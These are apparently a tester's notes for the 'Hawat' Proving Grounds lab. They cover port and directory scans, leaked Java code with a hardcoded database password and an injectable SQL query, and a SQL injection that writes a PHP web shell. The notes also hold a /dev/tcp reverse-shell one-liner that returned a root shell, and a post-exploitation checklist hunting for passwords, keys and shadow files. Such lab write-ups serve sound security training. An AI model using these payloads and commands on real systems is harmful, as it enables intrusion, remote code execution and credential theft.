**Metadata**

- IP Address:  192.168.219.147
- Hostname: hwat
- OS: 	
- Found Credentials/Users:

Main Objectives:

Local.txt = 
Proof.txt = 

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.219.147 -oN - 
# Nmap 7.95 scan initiated Tue Mar 10 16:49:53 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.219.147
Nmap scan report for 192.168.219.147
Host is up (0.084s latency).
Not shown: 995 filtered tcp ports (no-response), 4 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.219.147 -oN /home/kali/ProvingGround/Hawat/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Hawat/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 16:50 MDT
Nmap scan report for 192.168.219.147
Host is up (0.082s latency).
Not shown: 65527 filtered tcp ports (no-response), 4 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
17445/tcp open  http    Apache Tomcat (language: en)
30455/tcp open  http    nginx 1.18.0
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)



```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 22, 17445, 30455, 50080
[+] Open UDP ports (open only): <none>
```

3. SSH Enumeration

```
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)

```

4. Web Enumeration (Port 17445)

```
Webserver Info - Apache Tomcat
Running Applications - 
Site Visit - 
1. Looks like an issue tracker. You can create users and log in to view and edit issues.

whatweb -v http://target

[+] Running: Gobuster BASIC (17445) (exclude-length 0)
[+] Command: gobuster dir -u http://192.168.219.147:17445 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Hawat/gobuster/Hawat_192.168.219.147_17445_dir_basic.txt --exclude-length 0 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.147:17445
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1167]
/register             (Status: 200) [Size: 1603]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished


curl -i http://target

```

5. Web Enumeration (Port 30455)

```
Webserver Info - nginx/1.18.0
Running Applications - PHP/7.4.15

Site Visit - 
1. Website listing a sale.
2. http://192.168.219.147:30455/?title=test found in source code. You can change the HTML by changing the word test.
3.phpinfo.php available

[+] Running: Gobuster BASIC (30455)
[+] Command: gobuster dir -u http://192.168.219.147:30455 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Hawat/gobuster/Hawat_192.168.219.147_30455_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.147:30455
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/4                    (Status: 301) [Size: 169] [--> http://192.168.219.147:30455/4/]
/index.php            (Status: 200) [Size: 3356]
/phpinfo.php          (Status: 200) [Size: 68610]
Progress: 4437 / 4613 (96.18%)
===============================================================
Finished



curl -i http://target

```

![[Pasted image 20260312131109.png]]

![[Pasted image 20260312131344.png]]

6. Web Enumeration (Port 50080 )

```
Webserver Info - Apache httpd 2.4.46 
Running Applications - PHP/7.4.15
Site Visit - 
1. Found an interesting endpoint at http://192.168.219.147:50080/cloud
2. Logged in as admin/admin
3. Found some loot. Looks like source code for the issuetracker app. 
   
        @GetMapping("/issue/checkByPriority")
        public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
                    Statement stmt = conn.createStatement();
                    stmt.executeQuery(query);

        } catch (SQLException e1) {
                        // TODO Auto-generated catch block
                        e1.printStackTrace();



whatweb -v http://target

[+] Command: gobuster dir -u http://192.168.219.147:50080 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Hawat/gobuster/Hawat_192.168.219.147_50080_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.147:50080
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/4                    (Status: 301) [Size: 239] [--> http://192.168.219.147:50080/4/]
/images               (Status: 301) [Size: 244] [--> http://192.168.219.147:50080/images/]
/index.html           (Status: 200) [Size: 9088]
Progress: 4612 / 4613 (99.98%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished


curl -i http://target

```

7. Possible Exploits

```
String query = "SELECT message FROM issue WHERE priority='"+priority+"'";

Web Application is run by root

Document source is /srv/http
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Looks like there is a possible sqli at http://192.168.219.147:17445/issue/checkByPriority?priority=.

- Tested blind sqli. 

```
POST /issue/checkByPriority?priority=High%27+AND+SLEEP%285%29--+- HTTP/1.1
```

![[Pasted image 20260312135115.png]]

- Successfully attempted to write php shell Union Select and Into Outfile functions. 

```
High' UNION SELECT '<?php echo system($_GET["cmd"]);' INTO OUTFILE '/srv/http/cmd.php'; --
```

- URL encoded. 

```
High%27+UNION+SELECT+%27%3C%3Fphp+echo+system%28%24_GET%5B%22cmd%22%5D%29%3B%27+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B+--
```

- Send request via Burpsuite. 

![[Pasted image 20260312135755.png]]

- Tested webshell

```
http://192.168.219.147:30455/cmd.php?cmd=id
```

![[Pasted image 20260312140026.png]]

- Created reverse shell payload and url encoded. 
  
```
0<&196;exec 196<>/dev/tcp/192.168.45.215/443; bash <&196 >&196 2>&196

0%3C%26196%3Bexec+196%3C%3E%2Fdev%2Ftcp%2F192.168.45.215%2F443%3B+bash+%3C%26196+%3E%26196+2%3E%26196
```

- Send reverse shell.

![[Pasted image 20260312140926.png]]

- Received shell as root. 

![[Pasted image 20260312141052.png]]
2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
whoami

id

hostname

pwd

uname -a

cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null

```

2. Environment

```
env

set 2>/dev/null | head -n 50

echo "$PATH"

echo "HOME=$HOME"; echo "SHELL=$SHELL"

```

3. User & Home Directories

```
cat /etc/passwd

ls -la /home

ls -la /root 2>/dev/null

sudo -l 2>/dev/null

sudo -V 2>/dev/null | head -n 10
```

4. Writable Paths & Permissions

```
find / -writable -type d 2>/dev/null | head -n 50

find / -writable -type f 2>/dev/null | head -n 50

echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done

find / -user "$(id -un)" -type f 2>/dev/null | head -n 50

ls -l /etc/passwd 2>/dev/null

ls -l /etc/shadow 2>/dev/null

ls -la / 2>/dev/null

```

4. SUID / SGID / Capabilities

```
find / -perm -4000 -type f 2>/dev/null

find / -perm -2000 -type f 2>/dev/null

getcap -r / 2>/dev/null

```

5. Cron & Scheduled Tasks

```
cat /etc/crontab 2>/dev/null

ls -la /etc/cron.* 2>/dev/null

crontab -l 2>/dev/null
```

6. Processes & Network

```
ps aux

ps -ef

ss -tulwn 2>/dev/null

netstat -tulnp 2>/dev/null
```

7.  Software / Packages

```
dpkg -l 2>/dev/null | head -n 200

rpm -qa 2>/dev/null | head -n 200
```

8. Loot Files & Credentials

```
grep -R "password" /etc 2>/dev/null | head -n 50

ls -la /var/www 2>/dev/null

grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

find /home -type f -name "*.txt" 2>/dev/null

find /home -type f -name "*history*" 2>/dev/null

find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50

find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
```

9.  Containers / Virtualization

```
ls -la /.dockerenv 2>/dev/null

grep -i docker /proc/1/cgroup 2>/dev/null
```

10. Automated Enumeration 

```


```

11. Possible PE Paths

```

```

**Privilege Escalation**

1. PE Steps

```

```

2. Notes

```

```

